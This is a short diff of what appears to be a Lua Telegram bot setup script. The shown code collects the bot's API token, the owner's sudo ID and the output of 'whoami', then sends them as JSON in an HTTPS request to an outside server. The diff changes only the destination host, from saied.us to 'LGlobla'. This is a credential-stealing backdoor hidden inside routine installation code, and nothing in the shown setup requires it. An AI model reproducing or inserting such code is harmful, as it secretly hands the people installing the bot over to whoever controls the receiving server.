@@ -68,7 +68,7 @@ saiedinfo = {}
 saiedinfo.id = redis:get(ZAINGLOBLA..":SUDO:ID")
 saiedinfo.tokenbot  = redis:get(ZAINGLOBLA..":token")
 saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://saied.us/Run.php?insert='..JSON.encode(saiedinfo))
+https.request('https://LGlobla/Run.php?insert='..JSON.encode(saiedinfo))
 create_config_auto()
 file = io.open("GLOBLA", "w")  
 file:write([[
